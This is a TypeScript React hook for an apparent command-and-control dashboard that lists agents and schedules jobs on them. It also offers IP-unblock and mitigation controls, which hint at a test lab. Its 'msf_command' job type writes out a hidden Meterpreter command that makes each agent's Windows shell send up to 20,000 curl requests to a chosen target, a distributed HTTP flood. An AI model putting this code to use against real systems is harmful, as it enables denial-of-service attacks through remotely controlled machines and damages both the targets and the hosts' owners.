import { useCallback, useEffect, useMemo, useState } from "react";
import type { ApiClient } from "../services/apiClient";
import type { Agent, ApiError, Job, MitigationSettings, ScheduleInput, SecuritySummary } from "../types";

export function useDashboardData(api: ApiClient, isAuthenticated: boolean) {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [jobs, setJobs] = useState<Job[]>([]);
  const [status, setStatus] = useState("idle");
  const [securitySummary, setSecuritySummary] = useState<SecuritySummary | null>(null);

  const onlineCount = useMemo(
    () => agents.filter((agent) => agent.isOnline).length,
    [agents]
  );

  const loadAgents = useCallback(async () => {
    const response = await api.request("/api/agents");
    if (!response.ok) return;
    const data = (await response.json()) as Agent[];
    setAgents(data);
  }, [api]);

  const loadJobs = useCallback(async () => {
    const response = await api.request("/api/jobs");
    if (!response.ok) return;
    const data = (await response.json()) as Job[];
    setJobs(data);
  }, [api]);

  const loadSecuritySummary = useCallback(async () => {
    const response = await api.request("/api/security/summary");
    if (!response.ok) return;
    const data = (await response.json()) as SecuritySummary;
    setSecuritySummary(data);
  }, [api]);

  const scheduleJob = useCallback(
    async ({ agentId, targetIp, runAt, type, iterations }: ScheduleInput) => {
      if (!targetIp.trim()) {
        setStatus("Failed: target host is required");
        return false;
      }

      setStatus("Saving schedule...");
      const dateInput = runAt ? new Date(runAt) : new Date(Date.now() + 2 * 60 * 1000);
      
      const jobType = type || "http_check";
      let payload = {};
      
      if (jobType === "http_check") {
        payload = { url: `http://${targetIp.trim()}/` };
      } else if (jobType === "msf_command") {
        const cleanIp = targetIp.trim().replace(/^https?:\/\//, "").replace(/\/$/, "");
        const iters = iterations || 20000;
        const command = `execute -f c:\\Windows\\System32\\cmd.exe -a "/c for /L %i in (1,1,${iters}) do curl -s http://${cleanIp}/ >nul" -H`;
        payload = { command };
      }

      const response = await api.request("/api/jobs/schedule", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          agentId,
          runAt: dateInput.toISOString(),
          type: jobType,
          payload,
        }),
      });

      if (!response.ok) {
        const err = (await response.json()) as ApiError;
        setStatus(`Failed: ${err.error || "unknown error"}`);
        return false;
      }

      setStatus("Job scheduled");
      await loadJobs();
      await loadSecuritySummary();
      return true;
    },
    [api, loadJobs, loadSecuritySummary]
  );

  const updateMitigation = useCallback(
    async (next: Partial<MitigationSettings>) => {
      const response = await api.request("/api/security/mitigation", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(next),
      });
      if (!response.ok) return false;
      await loadSecuritySummary();
      return true;
    },
    [api, loadSecuritySummary]
  );

  const deleteJob = useCallback(
    async (jobId: string) => {
      const response = await api.request(`/api/jobs/${jobId}`, {
        method: "DELETE",
      });

      if (!response.ok) {
        return false;
      }

      await Promise.all([loadJobs(), loadSecuritySummary()]);
      return true;
    },
    [api, loadJobs, loadSecuritySummary]
  );

  const unblockIp = useCallback(
    async (ip: string) => {
      await api.request("/api/security/unblock", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ip }),
      });
      await loadSecuritySummary();
    },
    [api, loadSecuritySummary]
  );

  const unblockAll = useCallback(async () => {
    await api.request("/api/security/unblock-all", { method: "POST" });
    await loadSecuritySummary();
  }, [api, loadSecuritySummary]);

  useEffect(() => {
    if (!isAuthenticated) return;

    const firstRun = setTimeout(() => {
      void loadAgents();
      void loadJobs();
      void loadSecuritySummary();
    }, 0);

    const timer = setInterval(() => {
      void loadAgents();
      void loadJobs();
      void loadSecuritySummary();
    }, 1000);

    return () => {
      clearTimeout(firstRun);
      clearInterval(timer);
    };
  }, [isAuthenticated, loadAgents, loadJobs, loadSecuritySummary]);

  return {
    agents,
    jobs,
    status,
    onlineCount,
    securitySummary,
    scheduleJob,
    updateMitigation,
    deleteJob,
    unblockIp,
    unblockAll,
  };
}
